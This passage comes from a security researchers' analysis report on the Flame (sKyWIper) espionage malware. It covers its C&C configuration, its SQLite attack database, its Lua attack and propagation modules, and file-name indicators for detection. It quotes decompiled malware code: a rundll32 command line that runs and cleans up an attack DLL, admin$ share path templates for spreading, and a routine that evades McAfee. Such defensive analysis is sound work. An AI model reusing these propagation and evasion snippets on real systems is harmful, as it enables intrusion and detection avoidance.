The malware is curious about lot of things. Some examples from the long list of interests are shown in the figure below:

![](_page_38_Picture_7.jpeg)

```
HKLM\Security\Policy\PolSecretEncryptionKey - string double compressed in res146
select * from CIM_HostedAccessPoint; ? root\cimv2▲ ? Access PointsW -string from
res146, compressed F
HKIU\Software\Microsoft\office -?? res146 compressed string
HKIU\Software\Adobe\Adobe Acrobat – surely interesting from propagation
perspective. res146 compressed string
HKIU\Network - res146 compressed string
HKLM\SAM\SAM\Domains\Account\F♥ P - string from res146 compressed strings
```
Figure 39 – Items the malware is interested in

![](_page_39_Picture_2.jpeg)

## 5. C&C communication

C&C communication is defined under the name GATOR. Resource 146 contains key-value pairs or templates related to GATOR configuration.

```
GATOR.CMD.SUCCESS VALIDITY
GATOR.LEAK.MIN BYTES TO LEAK
GATOR.LEAK.SUICIDE LOG LEAK SIZE
GATOR.LEAK.BANDWITH CALCULATOR.LEAK SECS
GATOR.INTERNET CHECK.MIN TIME BETWEEN CHECKS
GATOR.INTERNET CHECK.CURRENT FAILURES COUNT
GATOR.INTERNET CHECK.SERVERS.size
GATOR.INTERNET CHECK.SERVERS.1.prev
GATOR.INTERNET CHECK.SERVERS.1.next
GATOR.INTERNET CHECK.SERVERS.1.data
GATOR.INTERNET CHECK.SERVERS.1.data.TIMEOUT
GATOR.INTERNET CHECK.SERVERS.1.data.URL
GATOR.INTERNET CHECK.SERVERS.1.data.VALIDITY
(servers are stored in the file from 1 to 6)
GATOR.SERVERS.size
GATOR.SERVERS.first
GATOR . SERVERS . last
GATOR.SERVERS.free
GATOR.SERVERS.1.prev
GATOR.SERVERS.1.next
GATOR.SERVERS.1.prev
GATOR.SERVERS.1.data.USESSL
GATOR. SERVERS. 1. data. PORT
GATOR.SERVERS.1.prev
GATOR.SERVERS.1.prev
GATOR.SERVERS.1.prev
GATOR.SERVERS.1.prev
GATOR.SERVERS.1.prev
(gator servers are defined from 1 to 5)
```
We received information of more than 50 different domain names related to the C&C communication and more than 15 distinct IP addresses. C&C servers are changed frequently by changing the IP address of the particular host/domain name (the well-known fluxing technique used by botnets).

Many more configuration settings and logs for C&C communications can be found in the to691.tmp file.

![](_page_40_Picture_6.jpeg)

Figure 40 - Gator communication related data in resource 146 of mssecmgr.ocx (main module)

```
C:\Program Files\Common Files\Microsoft Shared\MSAuthCtrl\secindex.dat


GATOR.SERVERS.1.data.SITE
SINGLE CMD RUNNER
GATOR.SERVERS.1.data.SITE XXXX.info->XXXXX.com
GATOR.SERVERS.1.data.URL cgi-bin/counter.cgi->wp-content/rss.php
GATOR.SERVERS.-1.SITE [NoValue]->XXXX.info
GATOR.SERVERS.-1.USESSL [NoValue]->False
GATOR.SERVERS.-1.TIMEOUT [NoValue]->180000
GATOR.SERVERS.-1.URL [NoValue]->wp-content/rss.php
GATOR.SERVERS.-1.PORT [NoValue]->80
GATOR.SERVERS.-1.PASSWORD [NoValue]->LifeStyle2
XXX.info
SINGLE CMD RUNNER
P CMDS.RESTORE REDIRECTION STATE
SINGLE CMD RUNNER
SINGLE CMD RUNNER
P CMDS.RESTORE REDIRECTION STATE.SECS BETWEEN RUNS [NoValue]->87654
P CMDS.RESTORE REDIRECTION STATE.MAX RUNS [NoValue]->2
P_CMDS.RESTORE_REDIRECTION_STATE.CMD_BUF_[NoValue]->BUF_SITE:271_CRC:525FXXXX
P CMDS.RESTORE REDIRECTION STATE.NUM OF RUNS [NoValue]->0
SINGLE CMD RUNNER
SINGLE CMD RUNNER
GATOR.LEAK.NEXT_REQUEST_TIME_314821->1222222222
GATOR.LEAK.NEXT REQUEST SYS TIME 133XXX2106->1222222222
SINGLE CMD RUNNER
SINGLE CMD RUNNER
MANAGER.FLAME ID 13XXXXX15X->13
SINGLE CMD RUNNER
SINGLE CMD RUNNER
GATOR.CMD.NEXT REQUEST TIME 340504->O
COMAGENT
 COMAGENTWORKER
WEASEL
TDLER
CommandExecuter
CommandFileFinder
MICROBE
MICROBE SECURITY
GadgetSupplierWaitThread
MICROBE SECURITY
MICROBE
SINGLE CMD RUNNER
C:\WINDOWS\system32\advpck.dat
C:\WINDOWS\system32\advpck.dat, EnableTBS
C:\WINDOWS\system32\advpck.dat
C:\WINDOWS\system32\ntaps.dat, EnableSHR
C:\WINDOWS\system32\ntaps.dat, EnableOFR
```
![](_page_41_Picture_1.jpeg)

SINGLE\_CMD\_RUNNER

Figure 41 – To691.tmp strings on C&C communications and other activity

![](_page_42_Picture_2.jpeg)

## 6. Attack details - dictionary and scripts

The file dstrlog.dat contains a ClanDB for names and terms used by the malware, an SQLite database used for attacks. This file is loaded through libclandb.lua by SQL commands, and the database is accessed using Lua scripts. We disclose detailed description of the SQLite database to show the SQL tables used for attacks. The attackers even take care of versions, and update the structure if necessary. The sample below shows a version upgrade script.

```
if userVer == 1 or userVer == 2 then 1_26_0:exec("\n
ALTER TABLE entities ADD COLUMN tool id INTEGER NULL; \n
ALTER TABLE entities ADD COLUMN first update dt DATETIME INTEGER NULL; \n
ALTER TABLE entities ADD COLUMN last update dt  DATETIME INTEGER NULL; \n
ALTER TABLE entities ADD COLUMN last ip update dt DATETIME INTEGER NULL;\n
ALTER TABLE metadata ADD COLUMN first update dt DATETIME INTEGER NULL;\n
ALTER TABLE metadata ADD COLUMN last update dt DATETIME INTEGER NULL; \n
ALTER TABLE attack log ADD COLUMN home id INTEGER NULL; \n
ALTER TABLE attack log ADD COLUMN date dt DATETIME INTEGER NULL; \n
ALTER TABLE attack queue ADD COLUMN min attack interval INTEGER NULL; \n
ALTER TABLE attack queue ADD COLUMN home id INTEGER NULL;\n
                                                                        ALTER TABLE
attack queue ADD COLUMN last_try date_dt DATETIME INTEGER NULL;\n
ALTER TABLE attack queue ADD COLUMN igno
re max BOOLEAN INTEGER NOT NULL  DEFAULT 0;\n\n\t\t\tCREATE TABLE IF NOT EXISTS
cruise attack log (\n\t\t\t  log id INTEGER NOT NULL REFERENCES
attack log(line_id),\n\t\t\t  user sid TEXT NOT NULL,\n\t\t\t  usersKyMIper TEXT
NULL\n\t\t\t);\n\n
\t\t\tCREATE TABLE IF NOT EXISTS options per entity (\n\t\t\t  entity_id INTEGER
NOT NULL,\n\t\t\t  attack type TEXT NOT NULL,\n\t\t\t  cred id INTEGER
NULL,\n\t\t\t  retries left INTEGER NULL\n\t\t\t);\n\n
                                                                   CREATE TABLE IF
NOT EXISTS  attack params (\n
                                               attack queue id INTEGER NOT NULL, \n
name TEXT NOT NULL,\n
value NUMERIC NULL,\n\n
PRIMARY KEY(attack queue id, name)\n
                                                ); " )
```
Figure 42 – ClanDB update if version is too old

There are a number of names and phrases in the database used in the code of the malware. Deeper analysis is needed to fully understand all these references. Here, we include the result of our initial investigation with a note that these interpretations might not be correct.

Boost: Possibly information gathering based on enquiries received from remote parties.

Flame: Common name for attacks, most likely by exploits. Ef\_trace.txt relation. %temp%\dat3C.tmp and %systemroot%\\temp\\msdclr64.ocx related.

![](_page_43_Picture_7.jpeg)

Flask: Attacks can be Jimmy or Flask. Probably Flask is one flame. Not sure.

Jimmy: A specific CLAN attack type, but also a flame. CLAN probably refers to a local network attack while flame can be anything. Based on dll: "c:\Projects\Jimmy\jimmydll\_v2.0\JimmyForClan\Jimmy\bin\srelease\jimmydl\\inds vc32.pdb" reference can be found in it

Movefile: No information

Munch: Installation/propagation mechanism related to windows update and web downloads. Strings and possibly code can be found in mscrypt.dat

```
MUNCH.GENERIC BUFFERS.4.data.PATTERN
?*/windowsupdate/?/?elf?pdate/WSUS3/x86/Wista/WUClient-SelfUpdate-
ActiveX~31bf3856ad364e35~x86~~7.0.6000.381.cab*??
v6/windowsupdate/redir/wuredir.cab
v7/windowsupdate/redir/wuredir.cab
v8/windowsupdate/redir/muv3wuredir.cab
v9/windowsupdate/redir/muv4wuredir.cab
VISTA 7 VERSION S
*/version s.xml
MUT DENT
muident.cab
/windowsupdate/?/?elf?pdate/WSUS3/x86/Vista/wsus3setup.cab
download.windowsupdate.com/v6/windowsupdate/?/SelfUpdate/AU/x86/XP/en/wusetup.cab
/v9/windowsupdate/?/SelfUpdate/AU/x86/W2KSP2/*/wusetup.cab
/v9/windowsupdate/?/?elf?pdate/MSUS3/x86/Other/wsus3setup.cab
v7/windowsupdate/redir/wuredir.cab
v9/windowsupdate/redir/muv4wuredir.cab
```
Figure 43 - Munch attack related interesting strings

SFS: Storage files. Some DAT files, like ntcache.dat, Imcache.dat.

Snack: Related to Munch attack, possibly part of local propagation by exploit.

Spotter: Possibly some scanner

Transport: Replication method. Exploit-based propagation is most likely called flame, while that based on bad access permissions is a "Transport". E.g. "NU" or "NUSystem" refers to "net use" way of propagation.

![](_page_44_Picture_10.jpeg)

```
obj.REMOTE PATH TEMPLATES = {temp = string.format("\\\\\s\\\admin$\\temp",
l_4_0.tgt), systemroot = string.format("\\\\%s\\admin$", 1_4_0.tgt),
commonprogramfiles = string.format("\\\\\%s\\\ss$\\Program Files\\Common Files",
l 4 0.tgt, remoteSystemDrive)}
      obj.REMOTE_PATH_TEMPLATES.windir = obj.REMOTE_PATH_TEMPLATES.systemroot
      obj.REMOTE_LOCAL_PATH_TEMPLATES = {temp = "..\\temp"}
```

```
Figure 44 - Net use based propagation targets get configured
```
- Euphoria: "EuphoriaApp" handling. Related to a "Flame" attack. Related to "mediald". Possibly file leaking after successful attack.
- BUENO FLAME DLL KEY pointer to a large 1 MB binary in wpgfilter.dat
- CONFIG\_TABLE : Referred from Lua code for configuration directives. Contains lot of parameters for attacks. Not sure which configuration is that.
- Headache: Related to multiple attacks, possibly additional parameters or properties of the attacks.

Multiple phrases are related to animals in the malware:

- Gator: Windowsupdate based internet-check. If everything successful, things go on. If not, then there is a minimum and maximum waiting time defined, and a multiplier to increase retries slowly.
- Goat: Possibly C&C communications to GOAT servers

Frog: ??

Beetlejuice: ??

Microbe: ??

Weasel: ??

Great work is going on the topic! on 30/05 new information was published by Kasperksy

It's available at 

We updated this document to reflect up-to-date information on 30/05/2012.

So from Kaspersky:

![](_page_45_Picture_17.jpeg)

Here is a brief overview of the available units. The names were extracted from the binary and the 146 resource.

| Beetlejuice                                       | Bluetooth: enumerates devices around the infected machine.<br>May turn itself into a "beacon": announces the computer as a discoverable<br>device and encode the status of the malware in device information using<br>base64. |  |  |  |  |  |  |
|---------------------------------------------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|--|--|--|--|--|--|
| Microbe                                           | Records audio from existing hardware sources. Lists all multimedia devices,<br>stores complete device configuration, tries to select suitable recording<br>device.                                                            |  |  |  |  |  |  |
| Infectmedia                                       | Selects one of the methods for infecting media, i.e. USB disks. Available<br>methods: Autorun infector, Euphoria.                                                                                                             |  |  |  |  |  |  |
|                                                   | Creates "autorun.inf" that contains the malware and starts with a custom<br>Autorun infector("open" command. The same method was used by Stuxnet before it<br>employed the LNK exploit.                                       |  |  |  |  |  |  |
| Euphoria                                          | Create a "junction point" directory with "desktop.ini" and "target.lnk" from<br>LINK 1 and LINK2 entries of resource 146 (were not present in the resource<br>file). The directory acts as a shortcut for launching Flame.    |  |  |  |  |  |  |
| Limbo                                             | Creates backdoor accounts with login "HelpAssistant" on the machines<br>within the network domain if appropriate rights are available.                                                                                        |  |  |  |  |  |  |
| Frog                                              | Infect machines using pre-defined user accounts. The only user account<br>specified in the configuration resource is "HelpAssistant" that is created by<br>the "Limbo" attack.                                                |  |  |  |  |  |  |
| Munch                                             | HTTP server that responds to "/view.php" and "/wpad.dat" requests.                                                                                                                                                            |  |  |  |  |  |  |
| Snack                                             | Listens on network interfaces, receives and saves NBNS packets in a log<br>file. Has an option to start only when "Munch" is started. Collected data is<br>then used for replicating by network.                              |  |  |  |  |  |  |
| Boot dll loader                                   | Configuration section that contains the list of all additional modules that<br>should be loaded and started.                                                                                                                  |  |  |  |  |  |  |
| Weasel                                            | Creates a directory listing of the infected computer.                                                                                                                                                                         |  |  |  |  |  |  |
| Boost                                             | Creates a list of "interesting" files using several filename masks.                                                                                                                                                           |  |  |  |  |  |  |
| Telemetry                                         | Logging facilities                                                                                                                                                                                                            |  |  |  |  |  |  |
| Gator                                             | When an Internet connection becomes available, it connects to the C&C<br>servers, downloads new modules, and uploads collected data.                                                                                          |  |  |  |  |  |  |
| Security                                          | Identifies programs that may be hazardous to Flame, 1.e., anti-virus<br>programs and firewalls.                                                                                                                               |  |  |  |  |  |  |
| Bunny<br>Dbquery<br>Driller<br>Headache<br>Gadget | The purpose of these modules is not yet known.                                                                                                                                                                                |  |  |  |  |  |  |

![](_page_46_Picture_2.jpeg)

## 6.1. Some interesting Lua scripts inside the code

### CRUISE CRED.lua

The script gathers credential information from an already infected machine. More precisely, it cruises all the token objects to find the ones belong to the administrator or the Administrators, Domain Admins groups. If it is successful, it updates cruiseAttackLog in the "CLAN" database by means of the user sd and the user name. For more information, please see the Tables creds and cruise attack log in Figure 48.

### basic\_info\_app.lua

The script gathers basic information about an infected computer such as the flame version it has been infected with, the computer name, the ip address of the machine. Furthermore, it books various parameters about the nature of information leak (e.g., AVERAGE LEAK BANDWIDTH, LAST LEAK TO INTERNET, MEDIA LEAKS FROM THIS COMPUTER, etc). Note that the FLAME VERSION parameter must have been used to avoid the reinfection of the same computer and also to update flame if it is neccessary.

### clan\_seclog.lua

The script parses the Security log by searching for certain event Ids and retrieves the correspondig username and ip information from it. It is supposedly used to collect information about the traces of infection, or the credentials and source IPs used to authenticate to the infected machine. The script examines the following event Ids, where the corresponding log entries store the required pieces of information (Account Name, User Name and IP address)

Event Id: 540 – Refers to successful network logon. Among various parameters the log stores the User Name and Source Network Address as well.

Event Id: 672 - Refers to Authentication Ticket Granted Audit event. In case of Windows, the Kerberos authentication uses the optional pre-authentication phase before issuing an authentication ticket by checking the credentials of the client successfully authenticated to the workstation, Windows puts a log entry with event id 672 into the Security log in order to demonstrate the successful initial logon event.

![](_page_47_Picture_9.jpeg)

Event Id 673: - Refers to Service Ticket Granted Audit event. Once the authentication ticket is granted a service ticket have to be gained. If it is so, the client could successfully logon to the domain, and Windows puts a log entry with the 673 event Id to the Security Log.

Event Id 680: - Refers to Account Used for Logon by: <authentication package> .

json.lua: json related string functions only

casafety.lua: "CLANattack safety" tries to find out processes, registry information and similar related to ESET, KAV, McAfee, TrendMicro, and list from THREATENING PROGRAMS. Basically it's used to get information on how secure is to use the host from the perspective of the attacker.

Some file names that are referred from code:

```
ATTACK FLAME STARTLEAK: uses "%temp%\\~txqvsl.tmp"
ATTACKOP_FLASK_PRODS: uses "%temp%\\~mso2a2.tmp"
ATTACKOP_JIMMY_PRODS: uses "%temp%\\~dra53.tmp"
4784.dll creates the ~dra52.tmp and ~a29.tmp
```
### ATTACKOP JIMMY.lua:

ctx.exec:exec{{cmdLine = ctx.transport:expandLocal(string.format("cmd /c cd \"%%temp%%\" &&(if exist \"%s\" start /wait rundll32 \"%s\",%s)&move /y \"%% systemroot%%\\temp\\~dra52.tmp\" \"~dra53.tmp\" &del /q \"%s\"", remoteDLLBasename, remoteDLLBasename, dllExportedFunction, remoteDLLBasename)), mofInfo = {confPath = "LUA.CLAN.JIMMY MOF", fn = "svchost1ex.mof"}})

Below is a description of the attack DLL files used in the Jimmy attack.

```
00004784.dll - jimmy.dll - contains resource 164 "BIN"
-Resource 164 - ~60kbyte file, lot of 0x00 bytes, sparse information
contains extensions and string "Comodo" - encrypted
00005729.dll
00006411.dll
00004069.exe
```
#### Figure 45 - Internal executables/DLLs found in mssecmgr (main module)

ATTACKOP FLAME.luac ATTACKOP FLAME PRODS.luac ATTACKOP FLAME STARTLEAK.luac ATTACKOP FLASK.luac ATTACKOP FLASK PRODS.luac ATTACKOP JIMMY.luac

![](_page_48_Picture_12.jpeg)

ATTACKOP JIMMY PRODS.luac ATTACKOP MOVEFILE.luac ATTACKOP RUNDLL.luac CRUISE CRED.luac IMMED ATTACK ACTION.luac MUNCH ATTACKED ACTION.luac MUNCH SHOULD ATTACK.luac NETVIEW HANDLER.luac NETVIEW SPOTTER.luac REG SAFETY.luac RESCH EXEC.luac SECLOG HANDLER.luac SECLOG SPOTTER.luac SNACK BROWSER HANDLER.luac SNACK ENTITY ACTION.luac SNACK NBNS HANDLER.luac STD.luac SUCCESS FLAME.luac SUCCESS FLAME STARTLEAK.luac SUCCESS GET PRODS.luac TRANSPORT NUSYSTEM.luac TRANSPORT NU DUSER.luac USERPASS CRED.luac WMI EXEC.luac WMI SAFETY.luac attackop base prods.luac attackop\_base\_sendfile.luac basic info app.luac casafety.luac clan entities.luac clan seclog.luac euphoria app.luac event writer.luac fio.luac flame props.luac get cmd app.luac inline script.luac (possibly multiple) json.luac leak app.luac libclanattack.luac libclandb.luac libcommon.luac libdb.luac libflamebackdoor.luac liblog.luac libmmio.luac libmmstr.luac libnetutils.luac

![](_page_49_Picture_1.jpeg)

libplugins.luac libwmi.luac main app.luac payload logger.luac post cmd app.luac rts common.luac storage manager.luac table ext luac transport nu base.luac

Figure 46 – List of LUA scripts found in sKyWIper

## 6.2. Related files

### 0004784.dll (Jimmy.dll)

0004784.dll is part of the "Jimmy" attack hence we use the name jimmy.dll. It contains the string

```
"c:\Projects\Jimmy\jimmydll v2.0\JimmyForClan\Jimmy\bin\srelease\jimmydll\i
ndsvc32.pdb".
```
0004784.dll (jimmy.dll) can be extracted from decompressed resource 146 at position 0x2561F3.

By running the jimmy.dll with rundll32 jimmy.dll, QDInit, it starts to produce files ~a29.tmp and ~dra52.tmp. (QDInit == Quick Disk Inspection?) Related information can be found in lua files:

```
ATTACKOP JIMMY.lua:
                           ctx.exec:exec({cmdLine =
ctx.transport:expandLocal(string.format("cmd /c cd \"%%temp%8\" &&(if exist \"%s\"
start /wait rundl132 \"%s\",%s)&move /y \"%% systemroot%%\\temp\\~dra52.tmp\"
\"~dra53.tmp\" &del /q \"%s\"", remoteDLLBasename, remoteDLLBasename,
dllExportedFunction, remoteDLLBasename)), mofInfo = {confPath =
"LUA.CLAN.JIMMY_MOF", fn = "svchost1ex.mof"}})
```
![](_page_50_Figure_9.jpeg)

 The produced ~dra52.tmp in our samples contained around 580 byte compressed data (PPMd) on some partial file listings related information of some (5-10) files of the file system. The remaining data is compressed or encrypted.

![](_page_50_Picture_11.jpeg)

Most likely jimmy.dll is capable to grab screenshots and other modules perform other information stealing tasks.

If we run the jimmy.dll manually with rundll32, ~a29.tmp contains 12 bytes, bytes pos 0x4-0x7 are different on different systems, other bytes match.

### 00004069.exe

00004069.exe registers itself under the name "Windows Management Instrumentation Configurator", and contains references to %windir%\system32\rdcvlt32.exe %temp%\sl84.tmp WinInit.INI and other files.

## 6.3. SQLite table structure of CLAN DB

Attack and other information is stored in SQLite and unknown "CLAN" databases.

The dstrlog structure is described below. It appears unusual to use databases to store attack related information inside the malware, but apparently this is the case: mssecmgr.dll contains DB2 ODBC references inside (unknown goal) and attack strings contain Oracle references as well (most likely for information gathering).

![](_page_51_Picture_7.jpeg)

| Name                  | Object | Type                |
|-----------------------|--------|---------------------|
| emandes               | table  |                     |
| entity_id             | field  | INTEGER PRIMARY KEY |
| ""name                | field  | TEXT                |
| ip                    | field  | TEXT                |
| "" os ver             | field  | TEXT                |
| smb_type              | field  | INTEGER             |
| first update          | field  | INTEGER             |
| "last_update          | field  | INTEGER             |
| "last ip update       | field  | INTEGER             |
| "tool id              | field  | INTEGER             |
| first_update_dt       | field  | DATETIME INTEGER    |
| last_update_dt        | field  | DATETIME INTEGER    |
| """ last_ip_update_dt | field  | DATETIME INTEGER    |
| ·sglite_sequence      | table  |                     |
| "name                 | field  |                     |
| Das                   | field  |                     |
| attack params         | table  |                     |
| attack queue id       | field  | INTEGER PRIMARY KEY |
| "name                 | field  | TEXT PRIMARY KEY    |
| "" value              | field  | NUMERIC             |
| ·metadata             | table  |                     |
| entity id             | field  | INTEGER PRIMARY KEY |
| name                  | field  | TEXT PRIMARY KEY    |
| ···· value            | field  | TEXT PRIMARY KEY    |
| count                 | field  | INTEGER             |
| first_update          | field  | INTEGER             |
| "" last update        | field  | INTEGER             |
| first update dt       | field  | DATETIME INTEGER    |
| "" last_update_dt     | field  | DATETIME INTEGER    |
| + attack log          | table  |                     |

Figure 48 -dstrlog structure, part 1

![](_page_52_Picture_2.jpeg)

| Name                     | Object | Type                | A |  |
|--------------------------|--------|---------------------|---|--|
| attack log               | table  |                     |   |  |
| line id                  | field  | INTEGER PRIMARY KEY |   |  |
| " date                   | field  | INTEGER             |   |  |
| attack queue id          | field  | INTEGER             |   |  |
| entity id                | field  | INTEGER             |   |  |
| entity_addr              | field  | TEXT                |   |  |
| "cred id                 | field  | INTEGER             |   |  |
| "op_type                 | field  | TEXT                |   |  |
| success                  | field  | BOOLEAN INTEGER     |   |  |
| extra results            | field  | TEXT                |   |  |
| "retries left            | field  | INTEGER             |   |  |
| "home id                 | field  | INTEGER             |   |  |
| date dt                  | field  | DATETIME INTEGER    |   |  |
| attack_providers_log     | table  |                     |   |  |
| line id                  | field  | INTEGER PRIMARY KEY |   |  |
| "provider_type           | field  | TEXT PRIMARY KEY    |   |  |
| "provider_name           | field  | TEXT                |   |  |
| ""provider_result        | field  | BOOLEAN INTEGER     |   |  |
| ""provider_extra_results | field  | TEXT                |   |  |
| attack_queue             | table  |                     |   |  |
| attack queue id          | field  | INTEGER PRIMARY KEY |   |  |
| priority                 | field  | INTEGER             |   |  |
| entity id                | field  | INTEGER             |   |  |
| cred id                  | field  | INTEGER             |   |  |
| op type                  | field  | TEXT                |   |  |
| retries left             | field  | INTEGER             |   |  |
| "last try date           | field  | INTEGER             |   |  |
| "successful attacks left | field  | INTEGER             |   |  |
| min attack interval      | field  | INTEGER             |   |  |
| "home id                 | field  | INTEGER             |   |  |
| ""last_try_date_dt       | field  | INTEGER             |   |  |
| ignore_max               | field  | BOOLEAN INTEGER     |   |  |

Figure 49 -dstrlog structure, part 2

![](_page_53_Picture_2.jpeg)

| Name                                           | Object | Type                | A |  |
|------------------------------------------------|--------|---------------------|---|--|
| =-creds                                        | table  |                     |   |  |
| imcred id                                      | field  | INTEGER PRIMARY KEY |   |  |
| domain name                                    | field  | TEXT                |   |  |
| username                                       | field  | TEXT                |   |  |
| password                                       | field  | TEXT                |   |  |
| "user rid                                      | field  | INTEGER             |   |  |
| : dcname                                       | field  | TEXT                |   |  |
| cred type                                      | field  | INTEGER             |   |  |
| ·settings                                      | table  |                     |   |  |
| i key                                          | field  | TEXT PRIMARY KEY    |   |  |
| ···· value                                     | field  | INTEGER             |   |  |
| cruise_attack_log                              | table  |                     |   |  |
| pi bol id                                      | field  | INTEGER             |   |  |
| ""user sid                                     | field  | TEXT                |   |  |
| "user name                                     | field  | TEXT                |   |  |
| options_per_entity                             | table  |                     |   |  |
| entity id                                      | field  | INTEGER             |   |  |
| attack type                                    | field  | TEXT                |   |  |
| cred id                                        | field  | INTEGER             |   |  |
| "retries left                                  | field  | INTEGER             |   |  |
| entities idx name                              | index  |                     |   |  |
| entities idx ip                                | index  |                     |   |  |
| sglite autoindex metadata 1                    | index  |                     |   |  |
| attack_log_idx_entity                          | index  |                     |   |  |
| "sglite_autoindex_attack_providers_log_1 index |        |                     |   |  |
| "sqlite autoindex settings_1                   | index  |                     |   |  |
| "sglite_autoindex_attack_params_1              | index  |                     |   |  |

#### Figure 50 –dstrlog structure, part 3

![](_page_54_Picture_2.jpeg)

## 7. Evasion techniques

## 7.1. Security programs relation

The authors took extra precautions to evade detection by security products. The list is so comprehensive it is rarely seen. A very similar list can be found in the ccalc32drv.sys file, where table DangerousProcesses contains 346 items. We do not disclose the list as it could serve other malware authors for their goals.

## 7.2. Design choices and tricks

It can clearly be seen that this malware was continuously developed over a long time period and it employs several tricks to evade security products. For example, the extensions are chosen according to the detected anti-malware products. We found that the malware usually uses the .ocx extension, but this decision is based on how to get best under the radar. In case of McAfee McShield installed, the preferred extension is changed to .tmp as seen in the decompiled code segment below.

```
Transport.getPreferredDLLExtension = function(l 10 0)
            local remoteProcs = 1 10 0.ctx.remoteSafety:procList()
            local gotMcShield = false
            for pid,exe in pairs(remoteProcs) do
              if string.lower(exe) == "mcshield.exe" then
                gotMcShield = true
            else
              end
            end
            if gotMcShield then
              log.writeEx(-1453109576, 189173052,
log.colons(tostring(l 10 0.ctx.tgt), "tmp"))
              return "tmp"
            else
              return "ocx"
            end
               end
```
Figure 51 – Extension selection based on active A/V system

![](_page_55_Picture_7.jpeg)

## 7.3. Malware's own files list

sKyWlper puts its own files on a whitelist. Extra care should be taken of these files and constants, and they should possibly be put into IDS/IPS signatures:

preg.exe ntcache.dat lmcache.dat rccache.dat dcomm.dat dmmsapi.dat ~dra52.tmp commgr32 target.lnk ccalc32.sys authentication packages zff042 urpd.ocx Pcldrvx.ocx ~KWI guninst32 ~HLV ~DEB93D.tmp lib.ocx lss.ocx ~DEB83C.tmp stamn32 ~dra53.tmp nteps32 cmutlcfg.ocx ~DFL983.tmp ~DF05AC8.tmp ~DFD85D3.tmp ~a29.tmp dsmgr.ocx ~f28.tmp desc.ini fib32.bat ~d43a37b.tmp ~dfc855.tmp Ef trace.log contents.btr wrm3f0 scrcons.exe wmiprvse.exe

![](_page_56_Picture_3.jpeg)

| wlndh32                                |
|----------------------------------------|
| mprhlp                                 |
| kbdinai                                |
| services.exe                           |
| ~ZLM0D1.ocx                            |
| ~ZLM0D2.ocx                            |
| sstab                                  |
| m4aaux.dat                             |
| explorer.exe                           |
| gppref32.exe                           |
| inje                                   |
| svchost                                |
| iexplore                               |
| SeCEdit                                |
| ~nms534                                |
| Windows Authentication Client Manager  |
| Windows NT Enhanced Processing Service |
| ~rcf0                                  |
| ~rcj0                                  |

Figure 52 –Strings found in winlogon memory dump

Ccalc32drv.sys contains configuration settings for the malware. A part of it is a table "Exposureindicating" which should most likely mostly relate to the malware's own files.

| ExposureIndicating.1  | audcache      |
|-----------------------|---------------|
| ExposureIndicating.2  | audfilter.dat |
| ExposureIndicating.3n | ~ia33.tmp     |
| ExposureIndicating. 4 | commgr32      |
| ExposureIndicating.5  | nteps32       |
| ExposureIndicating. 6 | ~f28.tmp      |
| ExposureIndicating.7  | dsmgr.ocx     |
| ExposureIndicating.8  | ~nms534       |
| ExposureIndicating. 9 | m4aaux.dat.   |
| ExposureIndicating.10 | mpgaud.dat    |
| ExposureIndicating.11 | msaudio       |
| ExposureIndicating.12 | mspbee32      |
| ExposureIndicating.13 | ~a49.tmp      |
| ExposureIndicating.14 | mssvc32.ocx   |
| ExposureIndicating.15 | ~a38.tmp      |
| ExposureIndicating.16 | MSAudio       |
| ExposureIndicating.17 | boot32drv.sys |
| ExposureIndicating.18 | wave 9        |
| ExposureIndicating.19 | wavesup3.drv  |
| ExposureIndicating.20 | wpqfilter.dat |
| ExposureIndicating.21 | MSSecurityMgr |
| ExposureIndicating.22 | ssitable      |
| ExposureIndicating.23 | mssecmgr.ocx  |
| ExposureIndicating.24 | modevga.com   |

![](_page_57_Figure_4.jpeg)

| ExposureIndicating.25  | soapr32.ocx             |  |
|------------------------|-------------------------|--|
| ExposureIndicating.26  | indsvc32.ocx            |  |
| ExposureIndicating.27  | ~mso2a0.tmp             |  |
| ExposureIndicating.28  | ~mso2a2.tmp             |  |
| ExposureIndicating.29  | netprot32               |  |
| ExposureIndicating.30  | mssui.drv               |  |
| ExposureIndicating.31  | preq.exe                |  |
| ExposureIndicating.32  | ntcache.dat             |  |
| ExposureIndicating.33  | lmcache.dat             |  |
| ExposureIndicating.34  | rccache.dat             |  |
| ExposureIndicating.35  | dcomm.dat               |  |
| ExposureIndicating.36  | dmmsapi.dat             |  |
| ExposureIndicating.37  | authentication packages |  |
| ExposureIndicating.38  | zff042                  |  |
| ExposureIndicating.39  | indsvc32b.ocx           |  |
| ExposureIndicating.40  | ~dra52.tmp              |  |
| ExposureIndicating. 41 | ~KWI                    |  |
| ExposureIndicating.42  | ccalc32.sys             |  |
| ExposureIndicating.43  | ~HLV                    |  |
| ExposureIndicating.44  | urpd.ocx                |  |
| ExposureIndicating.45  | lib.ocx                 |  |
| ExposureIndicating.46  | Iss.ocx                 |  |
| ExposureIndicating.47  | target.Ink              |  |
| ExposureIndicating.48  | stamn32                 |  |
| ExposureIndicating.49  | quninst32               |  |
| ExposureIndicating.50  | ~DEB13DE.tmp            |  |
| ExposureIndicating.bl  | Pcldrvx.ocx             |  |
| ExposureIndicating.52  | nddesp32.ocx            |  |
| ExposureIndicating.53  | cmutlcfg.ocx            |  |
| ExposureIndicating.54  | ~DEB93D.tmp             |  |
| ExposureIndicating.55  | ~DEB83C.tmp             |  |
| ExposureIndicating.56  | ~dra53.tmp              |  |
| ExposureIndicating.57  | ~DFL983.tmp             |  |
| ExposureIndicating.58  | ~a29.tmp                |  |
| ExposureIndicating.59  | ~DF05AC8.tmp            |  |
| ExposureIndicating.60  | ~DFD85D3.tmp            |  |
| ExposureIndicating.61  | ~d43a37b.tmp            |  |
| ExposureIndicating.62  | wrm3f0                  |  |
| ExposureIndicating.63  | desc.ini                |  |
| ExposureIndicating. 64 | Ef trace.log            |  |
| ExposureIndicating.65  | wlndh32                 |  |
| ExposureIndicating.66  | mprhlp                  |  |
| ExposureIndicating.67  | kbdinai                 |  |
| ExposureIndicating.68  | contents.btr            |  |
| ExposureIndicating.69  | fib32.bat               |  |
| ExposureIndicating.70  | sstab                   |  |
| ExposureIndicating.71  | scrcons.exe             |  |
| ExposureIndicating.72  | wmiprvse.exe            |  |
| ExposureIndicating.73  | services.exe            |  |
| ExposureIndicating.74  | explorer.exe            |  |
| ExposureIndicating. /5 | inje                    |  |
| ExposureIndicating.76  | svchost                 |  |
| ExposureIndicating.77  | gppref32.exe            |  |
|                        |                         |  |

![](_page_58_Picture_1.jpeg)

